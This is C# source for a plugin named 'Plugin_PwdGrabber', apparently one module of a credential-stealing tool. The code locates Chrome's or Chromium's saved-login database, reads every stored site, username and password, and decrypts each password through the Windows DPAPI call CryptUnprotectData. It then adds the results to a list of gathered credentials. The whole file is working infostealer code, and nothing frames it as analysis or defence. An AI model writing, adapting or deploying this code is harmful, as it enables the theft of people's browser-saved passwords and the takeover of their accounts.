using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Plugin_PwdGrabber
{
    class Chrome
    {
        public static void Start(bool Chromium)
        {
            string Path;

            if (Chromium)
                Path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Chromium\User Data\Default\Login Data";
            else
                Path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Login Data";

            if (File.Exists(Path))
            {
                GrabData(Path, Chromium);
            }

        }

        public static void GrabData(string Path, bool Chromium)
        {
            SQLiteWrapper ChromeDB = new SQLiteWrapper(Path);

            ChromeDB.ReadTable("logins");

            for (int i = 0; i <= ChromeDB.GetRowCount() - 1; i++)
            {
                string Host = ChromeDB.GetValue(i, "origin_url");
                string Username = ChromeDB.GetValue(i, "username_value");
                string Password = Decrypt(System.Text.Encoding.Default.GetBytes(ChromeDB.GetValue(i, "password_value")));

                if (Chromium)
                    UserDataManager.GatheredCredentials.Add(new Credential("Chromium", Host, Username, Password, ""));
                else
                    UserDataManager.GatheredCredentials.Add(new Credential("Chrome", Host, Username, Password, ""));

            }
        }



        [DllImport("crypt32.dll",
                SetLastError = true,
                CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        private static extern
            bool CryptUnprotectData(ref DATA_BLOB pCipherText,
                                    string pszDescription,
                                    ref DATA_BLOB pEntropy,
                                        IntPtr pReserved,
                                    ref CRYPTPROTECT_PROMPTSTRUCT pPrompt,
                                        int dwFlags,
                                    ref DATA_BLOB pPlainText);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        internal struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        internal struct CRYPTPROTECT_PROMPTSTRUCT
        {
            public int cbSize;
            public int dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }

        // Wrapper for the NULL handle or pointer.
        static private IntPtr NullPtr = ((IntPtr)((int)(0)));

        // DPAPI key initialization flags.
        private const int CRYPTPROTECT_UI_FORBIDDEN = 0x1;
        private const int CRYPTPROTECT_LOCAL_MACHINE = 0x4;

        public static string Decrypt(byte[] pByte)
        {
            DATA_BLOB inj;
            DATA_BLOB ors = new DATA_BLOB();
            DATA_BLOB entropyBlob = new DATA_BLOB();
            CRYPTPROTECT_PROMPTSTRUCT prompt =
                                  new CRYPTPROTECT_PROMPTSTRUCT();

            GCHandle GHandle = GCHandle.Alloc(pByte, GCHandleType.Pinned);
            inj.pbData = GHandle.AddrOfPinnedObject();
            inj.cbData = pByte.Length;

            GHandle.Free();
            CryptUnprotectData(ref inj, string.Empty, ref entropyBlob, IntPtr.Zero, ref prompt, 0, ref ors);
            byte[] ReturnedData = new byte[ors.cbData];

            Marshal.Copy(ors.pbData, ReturnedData, 0, ors.cbData);
            string Temp = Encoding.Default.GetString(ReturnedData);

            return Temp;
        }
    }
}
